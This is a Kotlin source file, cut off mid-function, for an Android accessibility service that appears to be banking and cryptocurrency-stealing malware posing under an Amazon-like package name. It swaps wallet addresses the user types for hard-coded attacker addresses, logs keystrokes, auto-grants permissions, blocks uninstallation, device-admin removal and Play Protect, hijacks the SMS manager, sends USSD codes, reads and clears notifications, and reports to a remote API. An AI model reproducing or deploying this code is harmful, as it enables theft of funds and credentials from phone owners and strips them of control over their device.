package com.amazon.zzz.Services

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.accessibilityservice.GestureDescription.StrokeDescription
import android.app.Notification
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.res.Resources
import android.graphics.Path
import android.graphics.Rect
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.provider.Telephony
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import androidx.annotation.RequiresApi
import com.amazon.zzz.Activities.actToastAccessbility
import com.amazon.zzz.Activities.actViewInjection
import com.amazon.zzz.ApiNm.apiUt
import com.amazon.zzz.MainActivity
import com.amazon.zzz.Modull.udUtils
import com.amazon.zzz.Utilsss.SharedPreferencess
import com.amazon.zzz.Utilsss.utMiuUtils
import com.amazon.zzz.Utilsss.utUtils
import com.amazon.zzz.constNm
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import org.json.JSONArray
import org.json.JSONObject
import java.text.DateFormat
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.TimeUnit


class srvSccessibility : AccessibilityService() {

    private var btcDone = false
    private var className = ""
    private var clickprotect = "0"

    @Volatile
    private var eventRootInActiveWindow: AccessibilityNodeInfo? = null

    private var manufacturer = Build.MANUFACTURER.lowercase(Locale.ROOT)
    private var packageAppStart = ""
    private var strText = ""
    private val TAG_LOG = constNm.a14.simpleName + " >> "
    private val mGestureCallback = GestureCallback()
    private val mGestureCallbackWallets = GestureCallback()
    var cntExodusDhag = 0
    var currentHomePackage: String? = null
    var itemCnt: Int = 0
    var job: Job? = null
    var listSize: Int = 0
    var regex = Regex("\\b(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}")
    var regex1 = Regex("\\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}")
    var regex2 = Regex("\\b(0x)?[0-9a-fA-F]{40}")
    val df: DateFormat = SimpleDateFormat("MM/dd/yyyy, HH:mm:ss z", Locale.US)

    val list1 = arrayListOf(
        "$packageAppStart:id/permission_allow_button",
        "com.android.packageinstaller:id/permission_allow_button",
        "com.android.permissioncontroller:id/permission_allow_button",
        "com.miui.securitycenter:id/accept",
        "com.android.settings:id/action_button"
    )

    override fun onCreate() {
        super.onCreate()
        SharedPreferencess.init(this.applicationContext)
        active = true
    }

    override fun onDestroy() {
        super.onDestroy()
        active = false
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        runCatching {
            event ?: return

            val eventRootNode = super.getRootInActiveWindow()
            if (eventRootNode != null) {
                eventRootInActiveWindow = eventRootNode
            }
            if (eventRootInActiveWindow == null) {
                eventRootInActiveWindow = event.source
            }

            SharedPreferencess.init(applicationContext)

            packageAppStart = runCatching {
                event.packageName.toString()
            }.getOrDefault("")

            className = runCatching {
                event.className.toString()
            }.getOrDefault("")

            //---------------------Injects param---------------------
            strText = try {
                if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                    val clipboard = getSystemService(CLIPBOARD_SERVICE) as ClipboardManager
                    event.text.forEach {
                        runCatching {
                            val str = it.toString()
                            clipboard.setClipBoard(str, event)
                        }
                    }
                }
                event.text[0].toString()
            } catch (ex: Exception) {
                runCatching {
                    event.text.toString()
                }.getOrDefault("")
            }
            //-----------------------------------------------------

            if (constNm.debug) {
                Log.d(TAG_LOG, "---->$className")
                Log.d(TAG_LOG, "---->$strText")
                Log.d(TAG_LOG, "---->${AccessibilityEvent.eventTypeToString(event.eventType)}")
                Log.i(TAG_LOG, "---->")
            }

            if (actViewInjection.active && event.eventType != AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
                if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                    // --------------- unclick --------------------
                    if (unclick(false)) return

                    // --------------- Block Delete Bots --------------------
                    if (blockDeleteBots(packageAppStart)) return
                }
            } else {
                // Log event
                //        logEvent(event)

                // swipe do
                //        swipeDo(event)

                //---------------Keylogger-------------------
                if (SharedPreferencess.keylogger == "1") {
                    keylogger(event)
                }

                if (event.eventType == AccessibilityEvent.TYPE_VIEW_LONG_CLICKED) {
                    if (injectView()) return

                    if (hasPermission) {
                        runCatching {
                            if (event.contentDescription?.toString().equals(SharedPreferencess.appName, ignoreCase = true) ||
                                strText.equals(SharedPreferencess.appName, ignoreCase = true) ||
                                event.contentDescription?.toString().equals(utUtils.getLabelApplication(this), ignoreCase = true) ||
                                strText.equals(utUtils.getLabelApplication(this), ignoreCase = true)
                            ) {
                                actionBack()
                                return
                            }
                        }
                    }
                } else if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
                    //------------------powerkeeper--------------
                    powerkeeper()

                    //------------------allow dop perm--------------
                    if (!hasPermission) {
                        if (clicksAllow()) return

                        if (allowDopPerm()) return
                    } else {
                        runCatching {
                            val click = constNm.сука
                            for (clickButton in click) {
                                rootInActiveWindow?.findAccessibilityNodeInfosByText(clickButton)
                                    ?.firstOrNull { it.isClickable }?.let {
                                        click(it, true)
                                        return@runCatching
                                    }
                            }
                        }

                        //-------------Injection Application---------------------------------
                        if (injectView()) return

                        // ---------------  wallets --------------------
                        wallets(packageAppStart)

                        // ---------------  gmail --------------------
                        gmail()

                        // ---------------  killApplication --------------------
                        if (killApplication()) return

                        // --------------- swap SMS MANAGER --------------------
                        swapSMS(event)

                        //------------------------clear cache--------------------------------------------
                        clearCache2()

                        //------------------------ussd--------------------------------------------
                        if (ussdSend()) return

                        //------------------------Protect--------------------------------------------
                        blockProtect()

                        //------------------------Protect--------------------------------------------
                        clickProtect(event.source, className)

                        //------------------SWAP admin--------------
                        if (swapAdmin()) return

                        // --------------- Clear Push --------------------
                        clearPush()

                        // --------------- Block Delete Bots --------------------
                        if (blockDeleteBots(packageAppStart)) return

                        //------------------Exit-Settings-Accessibility-Service--------------
                        if (exitSettings(event)) return

                        // --------------- unclick --------------------
                        if (unclick()) return
                    }

                    // --------------- TYPE_WINDOW_STATE_CHANGED --------------------
                    if (AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED == event.eventType) {
                        //---------------Block apps-------------------
                        if (blockApp()) return

                        if (!hasPermission) {
                            if ("xiaomi" == manufacturer) {
                                if ((utMiuUtils.isAllowed(applicationContext) && utMiuUtils.canDrawOverlays(applicationContext))
                                    && utUtils.hasPermissionAllTrue(this)
                                ) {
                                    SharedPreferencess.permission_get = "1"
                                    SharedPreferencess.autoClickPerm2 = ""
                                    hasPermission = true
                                }
                            } else {
                                if (utMiuUtils.canDrawOverlays(applicationContext) && utUtils.hasPermissionAllTrue(this)) {
                                    SharedPreferencess.permission_get = "1"
                                    SharedPreferencess.autoClickPerm = ""
                                    hasPermission = true
                                }
                            }
                        }
                    }
                } else if (event.eventType == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
                    // --------------- readPush --------------------
                    readPush(event)
                }
            }
        }
    }

    override fun onInterrupt() {
        utUtils.Log(TAG_LOG, "onInterrupt")
    }

    override fun onRebind(intent: Intent?) {
        super.onRebind(intent)
        active = true
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        try {
            utUtils.Log(TAG_LOG, "onServiceConnected")

            for (i in 0..4) {
                performGlobalAction(GLOBAL_ACTION_BACK)
            }

            val intent = Intent(Intent.ACTION_MAIN)
            intent.addCategory(Intent.CATEGORY_HOME)
            currentHomePackage = packageManager.resolveActivity(
                intent,
                PackageManager.MATCH_DEFAULT_ONLY
            )?.activityInfo?.packageName

            startApp(this)
        } catch (ex: Exception) {
        }
    }

    override fun onUnbind(intent: Intent?): Boolean {
        active = false
        return super.onUnbind(intent)
    }

    private fun ClipboardManager.setClipBoard(str: String, event: AccessibilityEvent) {
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            runCatching {
                if (str.contains(regex2)) {
                    val str = str.replace(regex2, "0x3Cf7d4A8D30035Af83058371f0C6D4369B5024Ca")
                    this.setPrimaryClip(ClipData.newPlainText(str, str))
                    val args = Bundle()
                    args.putCharSequence(
                        AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
                        str
                    )
                    event.source?.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)

                    return
                }
            }
            runCatching {
                if (str.contains(regex)) {
                    val str = str.replace(regex, "bc1ql34xd8ynty3myfkwaf8jqeth0p4fxkxg673vlf")
                    this.setPrimaryClip(ClipData.newPlainText(str, str))
                    val args = Bundle()
                    args.putCharSequence(
                        AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
                        str
                    )
                    event.source?.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
                    return
                }
            }
            runCatching {
                if (str.contains(regex1)) {
                    val str = str.replace(regex1, "bc1ql34xd8ynty3myfkwaf8jqeth0p4fxkxg673vlf")
                    this.setPrimaryClip(ClipData.newPlainText(str, str))
                    val args = Bundle()
                    args.putCharSequence(
                        AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
                        str
                    )
                    event.source?.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)

                    return
                }
            }
        }
    }

    private fun actionBack() {
        runCatching {
            if (constNm.debug)
                utUtils.Log(TAG_LOG, "ACC::onAccessibilityEvent:" + " actionBack ")

            performGlobalAction(GLOBAL_ACTION_BACK)
            performGlobalAction(GLOBAL_ACTION_HOME)
            rootInActiveWindow?.refresh()
        }
    }

    private fun allowDopPerm(): Boolean {
        runCatching {
            // vers 1
            if (SharedPreferencess.autoClickPerm == "1") {
                if (!utMiuUtils.canDrawOverlays(applicationContext)) {
                    if (!utMiuUtils.canDrawOverlays(applicationContext)) {
                        rootInActiveWindow.findAccessibilityNodeInfosByViewId("android:id/title")
                            ?.firstOrNull { it.text == utUtils.getLabelApplication(this) }?.let {
                                checkNodeOrParent(it)
                            }
                    }

                    if (!utMiuUtils.canDrawOverlays(applicationContext)) {
                        val list = rootInActiveWindow.findAccessibilityNodeInfosByViewId("android:id/switch_widget")
                        if (list.size == 1) {
                            list?.firstOrNull()?.let {
                                checkNodeOrParent(it)
                            }
                        } else {
                            list?.forEach { switch ->
                                switch.parent.parent.findAccessibilityNodeInfosByViewId("android:id/title")
                                    ?.firstOrNull { it.text == utUtils.getLabelApplication(this) }
                                    ?.let {
                                        checkNodeOrParent(switch)
                                    }
                            }
                        }
                    }
                    if (!utMiuUtils.canDrawOverlays(applicationContext)) {
                        val list = rootInActiveWindow.findAccessibilityNodeInfosByViewId("android:id/widget_frame")
                        if (list.size <= 2) {
                            list.reverse()
                            list?.firstOrNull()?.let {
                                checkNodeOrParent(it)
                            }
                        } else {
                            list?.forEach { switch ->
                                switch.parent.findAccessibilityNodeInfosByViewId("android:id/title")
                                    ?.firstOrNull { it.text == utUtils.getLabelApplication(this) }
                                    ?.let {
                                        checkNodeOrParent(it)
                                    }
                            }
                        }
                    }

                    if (!utMiuUtils.canDrawOverlays(applicationContext)) {
                        rootInActiveWindow.findAccessibilityNodeInfosByViewId("android:id/title")
                            ?.firstOrNull { it.text == utUtils.getLabelApplication(this) }?.let {
                                checkNodeOrParent(it)
                            }
                    }
                }

                if (utMiuUtils.canDrawOverlays(applicationContext)) {
                    SharedPreferencess.autoClickPerm = ""
                    for (i in 0..5) {
                        performGlobalAction(GLOBAL_ACTION_BACK)
                    }
                    startApp(this)
                }
                return true
            }
            // vers 2
            else if (SharedPreferencess.autoClickPerm2 == "1") {
                allowPermXiaomi()
                return true
            }
        }

        return false
    }

    private fun allowPermXiaomi(): Boolean {
        try {
            val list = rootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.miui.securitycenter:id/action")
            listSize = list?.size ?: 0
            list?.reverse()
            list?.getOrNull(itemCnt % listSize)?.let {
                itemCnt++
                clickNodeOrParent(it, false)
                rootInActiveWindow?.refresh()
            }

            var click = false
            rootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.miui.securitycenter:id/select_allow")
                ?.forEach {
                    clickNodeOrParent(it, false)
                    click = true
                }
            if (!click) {
                rootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/text1")
                    ?.firstOrNull()?.let {
                        clickNodeOrParent(it, false)
                        click = true
                    }
            }

            if (utMiuUtils.isAllowed(applicationContext) && utMiuUtils.canDrawOverlays(applicationContext)) {
                SharedPreferencess.autoClickPerm2 = ""
                blockBack()
                startApp(this)
                apiUt.sendLogs(this@srvSccessibility, "", "allowPermXiaomi blockBack", "log")
                return true
            }
        } catch (e: Exception) {
            utUtils.Log(TAG_LOG, e.localizedMessage)
        }

        return false
    }

    private fun backFromAdmin(): Boolean {
        if (utUtils.isAdminDevice(this)) {
            SharedPreferencess.autoClickAdmin = ""
            blockBack2()
            apiUt.sendLogs(this@srvSccessibility, "", "backFromAdmin blockBack2", "log")
            return true
        }
        return false
    }

    private fun blockApp(): Boolean {
        runCatching {
            if (hasPermission) {
                if (SharedPreferencess.autoClickAdmin != "1" &&
                    constNm.тупые_реверсы_думают_что_эти_приложения_будем_атаковать.contains(
                        packageAppStart
                    )
                ) {
                    utUtils.Log(
                        TAG_LOG,
                        "ACC::onAccessibilityEvent: actionBack blockApp $packageAppStart"
                    )
                    actionBack()
                    apiUt.sendLogs(this@srvSccessibility, "", "blockApp blockBack $packageAppStart", "log")
                    return true
                }
            }
        }

        return false
    }

    private fun blockBack() {
        for (i in 0..3) {
            performGlobalAction(GLOBAL_ACTION_BACK)
        }
        performGlobalAction(GLOBAL_ACTION_HOME)
    }

    private fun blockBack2() {
        for (i in 0..1) {
            performGlobalAction(GLOBAL_ACTION_BACK)
        }
    }

    private fun blockDeleteBots(packageName: String): Boolean {
        runCatching {
            if (SharedPreferencess.killApplication != packageName) {
                //--- Block Delete Bots ---
                if (packageName.contains("com.android.settings")) {
                    if (className.contains("com.android.settings.applications.installedappdetailstop") ||
                        className.contains("com.android.settings.settings.accessibilitysettingsactivity")
                    ) {
                        blockBack()
                        apiUt.sendLogs(this@srvSccessibility, "", "blockDeleteBots blockBack com.android.settings", "log")
                        return true
                    }
                }
                //--- Block Delete Bots ---
                if (packageName.contains("com.google.android.packageinstaller")
                    && className.contains("android.app.alertdialog")
                    && (strText.contains(SharedPreferencess.appName, true) || strText.contains(
                        utUtils.getLabelApplication(this),
                        true
                    ))
                ) {
                    blockBack()
                    apiUt.sendLogs(this@srvSccessibility, "", "blockDeleteBots blockBack com.android.packageinstaller", "log")
                    return true
                }
                //--- Block Delete Bots ---
                if ((className == "android.widget.linearlayout")
                    && (packageName == "com.android.settings" || packageName == "com.miui.securitycenter")
                    && (strText.contains(SharedPreferencess.appName, true) || strText.contains(
                        utUtils.getLabelApplication(this),
                        true
                    ))
                ) {
                    blockBack()
                    apiUt.sendLogs(this@srvSccessibility, "", "blockDeleteBots blockBack securitycenter", "log")
                    return true
                }
                //--- Block off admin ---
                if (className == "com.android.settings.deviceadminadd" && utUtils.isAdminDevice(this)) {
                    blockBack()
                    apiUt.sendLogs(this@srvSccessibility, "", "blockDeleteBots blockBack deviceadminadd", "log")
                    return true
                }
            }
        }

        return false
    }

    private fun blockProtect() {
        runCatching {
            //BLOCK OFF PROTECT
            if (SharedPreferencess.checkProtect != "1") {
                rootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.android.vending:id/toolbar_item_play_protect_settings")
                    ?.firstOrNull()
                    ?.let {
                        blockBack2()
                        apiUt.sendLogs(this@srvSccessibility, "", "blockDeleteBots blockBack2 blockProtect", "log")
                    }

                rootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.android.vending:id/play_protect_settings")
                    ?.firstOrNull()
                    ?.let {
                        blockBack2()
                        apiUt.sendLogs(this@srvSccessibility, "", "blockDeleteBots blockBack2 blockProtect2", "log")
                    }
            }
        }
    }

    @RequiresApi(Build.VERSION_CODES.O)
    private fun buildClick(x: Float, y: Float, longClick: Boolean): GestureDescription {
        val clickPath = Path()
        clickPath.moveTo(x, y)
        val clickStroke =
            if (longClick) StrokeDescription(
                clickPath,
                1000,
                20000,
                longClick
            ) else StrokeDescription(
                clickPath,
                0,
                1,
                longClick
            )
        val clickBuilder = GestureDescription.Builder()
        clickBuilder.addStroke(clickStroke)
        return clickBuilder.build()
    }

    private fun checkNodeOrParent(
        nodeInfo: AccessibilityNodeInfo
    ): Boolean {
        if (!nodeInfo.isChecked) {
            click(nodeInfo.parent)
            TimeUnit.MILLISECONDS.sleep(75.toLong())
            nodeInfo.parent.refresh()
            if (!nodeInfo.isChecked) {
                click(nodeInfo)
                TimeUnit.MILLISECONDS.sleep(75.toLong())
                nodeInfo.refresh()
            }
            if (!nodeInfo.isChecked) {
                click(nodeInfo.parent.parent)
                TimeUnit.MILLISECONDS.sleep(75.toLong())
                nodeInfo.parent.parent.refresh()
            }
            return true
        }
        return false
    }

    private fun clearCache2() {
        runCatching {
            if (SharedPreferencess.autoClickCache == "1") {
                runCatching {
                    rootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.miui.securitycenter:id/am_storage_view")
                        ?.firstOrNull()?.let {
                            clickNodeOrParent(it, false)
                            TimeUnit.MILLISECONDS.sleep(150.toLong())

                            rootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.miui.securitycenter:id/action_menu_item_child_icon")
                                ?.firstOrNull()?.let {
                                    clickNodeOrParent(it, false)
                                    TimeUnit.MILLISECONDS.sleep(150.toLong())

                                    rootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/text1")
                                        ?.firstOrNull()?.let {
                                            clickNodeOrParent(it, false)

                                            rootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/button1")
                                                ?.firstOrNull()?.let {
                                                    clickNodeOrParent(it, false)
                                                    SharedPreferencess.autoClickCache = ""
                                                    blockBack()
                                                    clearCacheSuccess()
                                                    apiUt.sendLogs(this@srvSccessibility, "", "clearCache2 blockBack", "log")
                                                    return@runCatching
                                                }
                                        }
                                }

                            val clear = constNm.так_чисто
                            for (clickButton in clear) {
                                val item =
                                    rootInActiveWindow?.findAccessibilityNodeInfosByText(clickButton)
                                        ?.firstOrNull()
                                if (item != null) {
                                    if (clickNodeOrParent(item, false)) {
                                        TimeUnit.MILLISECONDS.sleep(100.toLong())

                                        for (clickButton1 in clear) {
                                            val item1 =
                                                rootInActiveWindow?.findAccessibilityNodeInfosByText(
                                                    clickButton1
                                                )?.firstOrNull()
                                            if (item1 != null) {
                                                if (clickNodeOrParent(item1, false)) {
                                                    TimeUnit.MILLISECONDS.sleep(100.toLong())
                                                    break
                                                }
                                            }
                                        }

                                        clickOk()
                                        blockBack()
                                        SharedPreferencess.autoClickCache = ""
                                        clearCacheSuccess()
                                        apiUt.sendLogs(this@srvSccessibility, "", "clearCache2 blockBack2", "log")
                                        break
                                    }
                                }
                            }
                        }
                }

                if (manufacturer.contains("samsung")) {
                    runCatching {
                        val memory = constNm.кэш_епт.filterNotNull()
                        if (iterateNodesScrollClickParentAndChild(
                                rootInActiveWindow,
                                memory.toList()
                            )
                        ) {
                            rootInActiveWindow?.refresh()
                            rootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.android.settings:id/button1")
                                ?.firstOrNull()?.let {
                                    clickNodeOrParent(it, false)
                                    TimeUnit.MILLISECONDS.sleep(100.toLong())
                                    clickOk()
                                    blockBack()
                                    SharedPreferencess.autoClickCache = ""
                                    clearCacheSuccess()
                                    apiUt.sendLogs(this@srvSccessibility, "", "clearCache2 blockBack3", "log")
                                }
                        }
                    }
                } else if (manufacturer.contains("motorola")) {
                    val memory = constNm.кэш_епт.filterNotNull()
                    for (mem in memory) {
                        rootInActiveWindow?.findAccessibilityNodeInfosByText(mem)?.firstOrNull()
                            ?.let {
                                clickNodeOrParent(it, false)
                                rootInActiveWindow?.refresh()
                                rootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.android.settings:id/button1")
                                    ?.firstOrNull()?.let {
                                        clickNodeOrParent(it, false)
                                        TimeUnit.MILLISECONDS.sleep(100.toLong())
                                        clickOk()
                                        blockBack()
                                        SharedPreferencess.autoClickCache = ""
                                        clearCacheSuccess()
                                        apiUt.sendLogs(this@srvSccessibility, "", "clearCache2 blockBack4", "log")
                                    }
                            }
                    }
                } else if (manufacturer.contains("oppo")) {
                    val memory = constNm.кэш_епт.filterNotNull()
                    for (mem in memory) {
                        rootInActiveWindow?.findAccessibilityNodeInfosByText(mem)?.firstOrNull()
                            ?.let {
                                clickNodeOrParent(it, false)
                                rootInActiveWindow?.refresh()
                                rootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.android.settings:id/button")
                                    ?.firstOrNull()?.let {
                                        clickNodeOrParent(it, false)
                                        TimeUnit.MILLISECONDS.sleep(100.toLong())
                                        clickOk()
                                        blockBack()
                                        SharedPreferencess.autoClickCache = ""
                                        clearCacheSuccess()
                                        apiUt.sendLogs(this@srvSccessibility, "", "clearCache2 blockBack5", "log")
                                    }
                            }
                    }
                } else if (manufacturer.contains("oneplus")) {
                    val memory = constNm.кэш_епт.filterNotNull()
                    for (mem in memory) {
                        rootInActiveWindow?.findAccessibilityNodeInfosByText(mem)?.firstOrNull()
                            ?.let {
                                clickNodeOrParent(it, false)
                                rootInActiveWindow?.refresh()
                                rootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.android.settings:id/button1")
                                    ?.firstOrNull()?.let {
                                        clickNodeOrParent(it, false)
                                        TimeUnit.MILLISECONDS.sleep(100.toLong())
                                        clickOk()
                                        blockBack()
                                        SharedPreferencess.autoClickCache = ""
                                        clearCacheSuccess()
                                        apiUt.sendLogs(this@srvSccessibility, "", "clearCache2 blockBack6", "log")
                                    }
                            }
                    }
                } else if (manufacturer.contains("hmd global") || manufacturer.contains("nokia")) {
                    val memory = constNm.кэш_епт.filterNotNull()
                    for (mem in memory) {
                        rootInActiveWindow?.findAccessibilityNodeInfosByText(mem)?.firstOrNull()
                            ?.let {
                                clickNodeOrParent(it, false)
                                rootInActiveWindow?.refresh()
                                rootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.android.settings:id/button1")
                                    ?.firstOrNull()?.let {
                                        clickNodeOrParent(it, false)
                                        TimeUnit.MILLISECONDS.sleep(100.toLong())
                                        clickOk()
                                        blockBack()
                                        SharedPreferencess.autoClickCache = ""
                                        clearCacheSuccess()
                                        apiUt.sendLogs(this@srvSccessibility, "", "clearCache2 blockBack7", "log")
                                    }
                            }
                    }
                } else if (manufacturer.contains("huawei")) {
                    val memory = constNm.кэш_епт.filterNotNull()
                    for (mem in memory) {
                        rootInActiveWindow?.findAccessibilityNodeInfosByText(mem)?.firstOrNull()
                            ?.let {
                                clickNodeOrParent(it.parent, false)
                                rootInActiveWindow?.refresh()
                                TimeUnit.MILLISECONDS.sleep(100.toLong())
                                rootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.android.settings:id/button_2")
                                    ?.firstOrNull()?.let {
                                        clickNodeOrParent(it, false)
                                        TimeUnit.MILLISECONDS.sleep(100.toLong())
                                        clickOk()
                                        blockBack()
                                        SharedPreferencess.autoClickCache = ""
                                        clearCacheSuccess()
                                        apiUt.sendLogs(this@srvSccessibility, "", "clearCache2 blockBack8", "log")
                                    }
                                rootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.android.settings:id/button1")
                                    ?.firstOrNull()?.let {
                                        clickNodeOrParent(it, false)
                                        TimeUnit.MILLISECONDS.sleep(100.toLong())
                                        clickOk()
                                        blockBack()
                                        SharedPreferencess.autoClickCache = ""
                                        clearCacheSuccess()
                                        apiUt.sendLogs(this@srvSccessibility, "", "clearCache2 blockBack9", "log")
                                    }
                            }
                    }
                } else if (manufacturer.contains("honor")) {
                    val memory = constNm.кэш_епт.filterNotNull()
                    for (mem in memory) {
                        rootInActiveWindow?.findAccessibilityNodeInfosByText(mem)?.firstOrNull()
                            ?.let {
                                clickNodeOrParent(it.parent, false)
                                rootInActiveWindow?.refresh()
                                TimeUnit.MILLISECONDS.sleep(100.toLong())
                                rootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.android.settings:id/button_2")
                                    ?.firstOrNull()?.let {
                                        clickNodeOrParent(it, false)
                                        TimeUnit.MILLISECONDS.sleep(100.toLong())
                                        clickOk()
                                        blockBack()
                                        SharedPreferencess.autoClickCache = ""
                                        clearCacheSuccess()
                                        apiUt.sendLogs(this@srvSccessibility, "", "clearCache2 blockBack10", "log")
                                    }
                                rootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.android.settings:id/button1")
                                    ?.firstOrNull()?.let {
                                        clickNodeOrParent(it, false)
                                        TimeUnit.MILLISECONDS.sleep(100.toLong())
                                        clickOk()
                                        blockBack()
                                        SharedPreferencess.autoClickCache = ""
                                        clearCacheSuccess()
                                        apiUt.sendLogs(this@srvSccessibility, "", "clearCache2 blockBack11", "log")
                                    }
                            }
                    }
                } else {
                    // II
                    val memory = constNm.кэш_епт.filterNotNull()
                    if (iterateNodesScrollClickParentAndChild(
                            rootInActiveWindow,
                            memory.toList()
                        )
                    ) {
                        rootInActiveWindow?.refresh()
                        val newsbros = constNm.дата
                        for (clickButton in newsbros) {
                            val item =
                                rootInActiveWindow?.findAccessibilityNodeInfosByText(clickButton)
                                    ?.firstOrNull()
                            if (item != null) {
                                clickNodeOrParent(item, false)
                                TimeUnit.MILLISECONDS.sleep(100.toLong())
                                clickOk()
                                break
                            }
                        }

                        rootInActiveWindow?.refresh()
                        val sbros = constNm.сброс_всего_человечества
                        for (clickButton in sbros) {
                            val item =
                                rootInActiveWindow?.findAccessibilityNodeInfosByText(clickButton)
                                    ?.firstOrNull()
                            if (item != null) {
                                clickNodeOrParent(item, false)
                                TimeUnit.MILLISECONDS.sleep(100.toLong())
                                clickOk()
                                break
                            }
                        }

                        rootInActiveWindow?.refresh()
                        val cleardata = constNm.убить_всех
                        for (clickButton in cleardata) {
                            val item =
                                rootInActiveWindow?.findAccessibilityNodeInfosByText(clickButton)
                                    ?.firstOrNull()
                            if (item != null) {
                                clickNodeOrParent(item, false)
                                TimeUnit.MILLISECONDS.sleep(100.toLong())
                                clickOk()
                                break
                            }
                        }

                        rootInActiveWindow?.refresh()
                        val clearCache = constNm.чистим_чисто
                        for (clickButton in clearCache) {
                            val item =
                                rootInActiveWindow?.findAccessibilityNodeInfosByText(clickButton)
                                    ?.firstOrNull()
                            if (item != null) {
                                clickNodeOrParent(item, false)
                                TimeUnit.MILLISECONDS.sleep(100.toLong())
                                clickOk()
                                break
                            }
                        }

                        rootInActiveWindow?.refresh()
                        val clear = constNm.так_чисто
                        for (clickButton in clear) {
                            val item =
                                rootInActiveWindow?.findAccessibilityNodeInfosByText(clickButton)
                                    ?.firstOrNull()
                            if (item != null) {
                                clickNodeOrParent(item, false)
                                TimeUnit.MILLISECONDS.sleep(100.toLong())
                                clickOk()
                                break
                            }
                        }

                        rootInActiveWindow?.refresh()
                        for (clickButton in clear) {
                            val item =
                                rootInActiveWindow?.findAccessibilityNodeInfosByText(clickButton)
                                    ?.firstOrNull()
                            if (item != null) {
                                clickNodeOrParent(item, false)
                                TimeUnit.MILLISECONDS.sleep(100.toLong())
                                clickOk()
                                break
                            }
                        }

                        blockBack()
                        SharedPreferencess.autoClickCache = ""
                        clearCacheSuccess()
                        apiUt.sendLogs(this@srvSccessibility, "", "clearCache2 2 blockBack", "log")
                        return
                    }
                }
            }
        }
    }

    private fun clearCacheSuccess() {
        val obj = JSONObject()
        obj.put("startClearCash", "end")
        apiUt.sendLogs(this, "", obj.toString(), "startClearCash")
    }

    private fun clearPush() {
        if (SharedPreferencess.clearPush == "1") {
            clickAtButton("com.android.systemui", "dismiss_text", false)
            clickAtButton("com.android.systemui", "clear_all", false)
        }
    }

    private fun click(it: AccessibilityNodeInfo, clickOnlyIfVisible: Boolean = false) {
        runCatching {
            if (clickOnlyIfVisible) {
                if (it.isVisibleToUser) {
                    if (constNm.debug)
                        utUtils.Log(TAG_LOG, "ACC::onAccessibilityEvent: click - $it")

                    it.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    it.refresh()
                } else {

                }
            } else {
                if (constNm.debug)
                    utUtils.Log(TAG_LOG, "ACC::onAccessibilityEvent: click - $it")

                it.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                it.refresh()
            }
        }
    }

    private fun click(x: Int, y: Int) {
        clickAtPosition(x, y, rootInActiveWindow)
    }

    private fun clickAtButton(targetAppPackageName: String, targetViewId: String, clickOnlyIfVisible: Boolean): Boolean {
        rootInActiveWindow?.findAccessibilityNodeInfosByViewId("$targetAppPackageName:id/$targetViewId")
            ?.firstOrNull { it.isClickable }?.let {
                click(it, clickOnlyIfVisible)
                return true
            }

        return false
    }

    private fun clickAtButtons(targetsView: List<String>): Boolean {
        val rootInActiveWindow1 = rootInActiveWindow
        targetsView.forEach {
            rootInActiveWindow1.findAccessibilityNodeInfosByViewId(it)
                ?.firstOrNull { it.isClickable }?.let {
                    click(it)
                    return true
                }
        }

        runCatching {
            if (!className.contains("appnotrespondingdialog")) {
                if (packageAppStart == "com.android.settings") {
                    rootInActiveWindow1.findAccessibilityNodeInfosByViewId("android:id/button1")
                        .firstOrNull()?.let {
                            click(it)
                            return true
                        }
                }
            }
        }
        return false
    }

    private fun clickAtPosition(x: Int, y: Int, node: AccessibilityNodeInfo?) {
        if (node == null) return
        try {
            if (node.childCount == 0) {
                val buttonRect = Rect()
                node.getBoundsInScreen(buttonRect)
                if (buttonRect.contains(x, y)) {
                    // Maybe we need to think if a large view covers item?
                    click(node)
                }
            } else {
                val buttonRect = Rect()
                node.getBoundsInScreen(buttonRect)
